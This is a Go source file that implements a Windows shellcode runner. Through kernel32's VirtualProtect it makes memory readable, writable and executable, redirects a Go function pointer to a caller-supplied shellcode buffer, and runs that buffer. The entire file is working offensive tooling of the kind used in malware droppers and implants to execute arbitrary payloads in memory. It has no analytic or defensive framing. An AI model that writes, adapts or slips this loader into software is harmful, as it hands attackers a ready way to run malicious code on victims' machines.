package pkg

import (
	"syscall"
	"unsafe"
)

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func virtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return fn0(ret)
}

func fn0(ret uintptr) bool {
	return ret > 0
}

func Run(shellcode []byte) {
	shellcodefunc := func() {}

	var oldfpemissions uint32
	if !virtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&shellcodefunc))),
		unsafe.Sizeof(uintptr(0)),
		uint32(0x40),
		unsafe.Pointer(&oldfpemissions)) {
		panic("Call to VirtualProtect failed!")
	}

	**(**uintptr)(unsafe.Pointer(&shellcodefunc)) = *(*uintptr)(unsafe.Pointer(&shellcode))

	var oldscepermissions uint32
	if !virtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&shellcode))),
		uintptr(len(shellcode)),
		uint32(0x40),
		unsafe.Pointer(&oldscepermissions)) {
		panic("Call to VirtualProtect failed!")
	}

	shellcodefunc()
}
